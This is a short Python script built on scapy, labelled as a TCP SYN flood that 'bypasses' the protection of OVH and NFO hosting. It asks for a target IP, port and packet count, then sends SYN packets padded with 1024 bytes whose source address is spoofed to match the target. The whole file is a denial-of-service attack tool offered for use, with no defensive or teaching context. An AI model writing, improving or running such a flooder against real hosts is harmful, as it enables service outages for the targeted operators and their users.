import socket
from scapy.all import *

# TCP SYN FLOOD (OVH & NFO BYPASS)
def main():
    count       = 0

    target      = input("Target IP: ")
    target_port = input("Target Port: ")
    amount      = input("Amount of packets: ")

    target_ip   = socket.gethostbyname(target)

    for count in range(int(amount)):
        ip      = IP(src=target_ip, dst=target_ip)
        tcp     = TCP(sport=RandShort(), dport=target_port, flags="S")
        raw     = Raw(b"X"*1024)
        p       = ip / tcp / raw
        send(p, loop=0, verbose=0)
        count   = count + 1

if __name__ == "__main__":
    main()
